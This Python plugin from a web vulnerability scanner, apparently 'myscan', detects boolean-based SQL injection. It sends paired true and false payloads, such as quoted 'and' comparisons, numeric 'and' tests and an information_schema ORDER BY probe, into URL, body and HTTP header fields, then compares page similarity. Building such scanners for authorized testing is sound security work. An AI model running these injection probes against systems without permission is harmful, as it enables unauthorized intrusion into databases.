#!/usr/bin/env python3
# @Time    : 2020-03-01
# @Author  : caicai
# @File    : myscan_sqli_boolen.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.data import logger,cmd_line_options
from myscan.lib.core.common import get_random_str, similar, get_random_num, getmd5, getredis
from myscan.lib.scriptlib.sqli.diffpage import findDynamicContent, removeDynamicContent, getFilteredPageContent
import copy, random
from myscan.lib.core.threads import mythread
from myscan.config import plugin_set

'''
测试and 注入,一般数据包数据都是正确的，所以不测试or注入
'''


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sqli boolen"
        self.vulmsg = "sqli boolen"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.verify_count = 3  # 验证次数

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        self.parser = dictdata_parser(self.dictdata)
        # send again . to find dynamic text
        self.dynamic = []
        r = request(**self.parser.getrawrequest())
        if r != None:
            ret = findDynamicContent(self.parser.getresponsebody().decode(errors="ignore"), r.text)
            if ret:
                self.dynamic.extend(ret)
            if self.dictdata.get("response").get("mime_stated") == "HTML":
                self.text = getFilteredPageContent(removeDynamicContent(r.text, self.dynamic))
            else:
                self.text = removeDynamicContent(r.text, self.dynamic)
        else:
            return

        # test url and body params
        sql_flag = [
            "' and '{0}'='{1}",
            '" and "{0}"="{1}',
        ]
        # url and body
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        if params:
            for param in params:
                success = False
                payloads = copy.deepcopy(sql_flag)
                if param.get("value") in ["desc", "asc"]:
                    payloads += [",if('{0}'='{1}',1,(select 1 from information_schema.tables))"]
                for payload in payloads:
                    random_str = get_random_str(2).lower()
                    payload_right = payload.format(random_str + "a", random_str + "a")
                    payload_false = payload.format(random_str + "b", random_str + "c")
                    req_true = self.parser.getreqfromparam(param, "a", payload_right)
                    req_false = self.parser.getreqfromparam(param, "a", payload_false)
                    if self.inject(req_false, req_true, payload_right, payload_false, param.get("name")):
                        success = True
                        break
                if not success and str(param.get("value")).isdigit():
                    param_value = param.get("value")
                    random_num = random.randint(2, 8)
                    payloads_num = [
                        ("/0", "*1"),
                        (' and {}={}'.format(random_num,random_num+1),
                         ' and {}={}'.format(random_num,random_num)
                         ),
                        ("/**/and {0}={1}".format(random_num, random_num + 1),
                         "/**/and {0}={1}".format(random_num, random_num)),
                        ("{}-1+2".format(param_value),"{}-1+1".format(param_value))
                    ]
                    for payload_false, payload_right in payloads_num:
                        req_true = self.parser.getreqfromparam(param, "a", payload_right)
                        req_false = self.parser.getreqfromparam(param, "a", payload_false)
                        if self.inject(req_false, req_true, param_value + payload_right, param_value + payload_false,
                                       param.get("name")):
                            break
                            pass
        # host header 部分
        if not plugin_set.get("sqli").get("header_inject"):
            return
        header_msg = {
            "User-Agent": {"msg": "sqli_boolen_ua",
                           "default": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"},
            "Referer": {"msg": "sqli_boolen_referer", "default": "https://www.qq.com/search"},
            "X-Forwarded-For": {"msg": "sqli_boolen_xff", "default": "12.40.9.144"},
            "Real-Ip": {"msg": "sqli_boolen_ri", "default": "2.40.9.144"},
            "X-Forwarded-Host": {"msg": "sqli_boolen_xfh", "default": "2.40.9.144"},
        }
        reqs = []

        for k, v in header_msg.items():
            if self.output(v.get("msg")):
                logger.debug("start {} inject ".format(k))

                headers = copy.deepcopy(self.dictdata.get("request").get("headers"))
                if k not in headers.keys():
                    headers[k] = v.get("default")
                reqs.append((headers, k, v))
        mythread(self.inject_headers,reqs,cmd_line_options.threads)

    def inject_headers(self,data):
        sql_flag = [
            "' and '{0}'='{1}",
            '" and "{0}"="{1}',
        ]
        headers, k, v = data
        for sql_ in sql_flag:
            found_flag = 0
            response_rt = b""
            response_rf = b""
            rf_similar = 0
            rt_similar = 0
            rt_rf_similar = 0
            payload_right=""
            payload_false=""
            random_str = get_random_str(2).lower()
            for count_num in range(self.verify_count):
                req_false_header=copy.deepcopy(headers)
                req_true_header=copy.deepcopy(headers)
                payload_false=sql_.format(random_str + "b", random_str + "c")
                payload_right=sql_.format(random_str + "b", random_str + "b")
                req_false_header[k]=req_false_header[k]+payload_false
                req_true_header[k]=req_true_header[k]+payload_right
                req_false=self.parser.generaterequest({"headers":req_false_header})
                req_true= self.parser.generaterequest({"headers":req_true_header})
                rf = request(**req_false)
                rt = request(**req_true)
                if rf != None and rt != None:
                    if self.dictdata.get("response").get("mime_stated") == "HTML":
                        rf_text = getFilteredPageContent(removeDynamicContent(rf.text, self.dynamic))
                        rt_text = getFilteredPageContent(removeDynamicContent(rt.text, self.dynamic))
                    else:
                        rf_text = removeDynamicContent(rf.text, self.dynamic)
                        rt_text = removeDynamicContent(rt.text, self.dynamic)
                    rf_similar = round(similar(rf_text, self.text), 3)
                    rt_similar = round(similar(rt_text, self.text), 3)
                    rt_rf_similar = round(similar(rf.text, rt.text), 3)
                    if rt_rf_similar != 1.0 and rt_similar > rf_similar and rt_similar > 0.98:
                        response_rt = response_parser(rt)
                        response_rf = response_parser(rf)
                        found_flag += count_num
                        continue
                break
            if found_flag == sum(range(self.verify_count)):
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url").get("url").split("?")[0],
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "param": "header's {}".format(k),
                        "payload": "payload_true:{}  payload_false:{}".format(payload_right, payload_false),
                        "similar_rate": "payload_true_rate:{}  payload_false_rate:{} payload_true_false_rate:{}".format(
                            rt_similar,
                            rf_similar,
                            rt_rf_similar),
                        "request_true": response_rt.getrequestraw(),
                        "response_true": response_rt.getresponseraw(),
                        "request_false": response_rf.getrequestraw(),
                        "response_false": response_rf.getresponseraw(),
                    }
                })
                return



    def inject(self, req_false, req_true, payload_right, payload_false, param_name):
        found_flag = 0
        response_rt = b""
        response_rf = b""
        rf_similar = 0
        rt_similar = 0
        rt_rf_similar = 0
        for count_num in range(self.verify_count):
            rf = request(**req_false)
            rt = request(**req_true)
            if rf != None and rt != None:
                if self.dictdata.get("response").get("mime_stated") == "HTML":
                    rf_text = getFilteredPageContent(removeDynamicContent(rf.text, self.dynamic))
                    rt_text = getFilteredPageContent(removeDynamicContent(rt.text, self.dynamic))
                else:
                    rf_text = removeDynamicContent(rf.text, self.dynamic)
                    rt_text = removeDynamicContent(rt.text, self.dynamic)
                rf_similar = round(similar(rf_text, self.text), 3)
                rt_similar = round(similar(rt_text, self.text), 3)
                rt_rf_similar = round(similar(rf.text, rt.text), 3)
                if rt_rf_similar != 1.0 and rt_similar > rf_similar and rt_similar > 0.98:
                    response_rt = response_parser(rt)
                    response_rf = response_parser(rf)
                    found_flag += count_num
                    continue
            break
        if found_flag == sum(range(self.verify_count)):
            self.result.append({
                "name": self.name,
                "url": self.dictdata.get("url").get("url").split("?")[0],
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "param": param_name,
                    "payload": "payload_true:{}  payload_false:{}".format(payload_right, payload_false),
                    "similar_rate": "payload_true_rate:{}  payload_false_rate:{} payload_true_false_rate:{}".format(
                        rt_similar,
                        rf_similar,
                        rt_rf_similar),
                    "request_true": response_rt.getrequestraw(),
                    "response_true": response_rt.getresponseraw(),
                    "request_false": response_rf.getrequestraw(),
                    "response_false": response_rf.getresponseraw(),
                }
            })
            return True


    def output(self, msg, insert=False):
        msg = "/".join(self.dictdata.get("url").get("url").split("/")[:3]) + " " + msg
        msgmd5 = getmd5(msg)[10:18]
        red = getredis()
        if insert == False:
            if not red.sismember("myscan_max_output", msgmd5):
                return True # 可以输出
            else:
                logger.debug("sql boolen moudle : {} 输出个数已达{}上限，不再测试输出".format(msg, self.verify_count))
                return False  # 不可以继续输出
        else:
            # red.hincrby("myscan_max_output", msgmd5, amount=1)
            red.sadd("myscan_max_output", msgmd5)

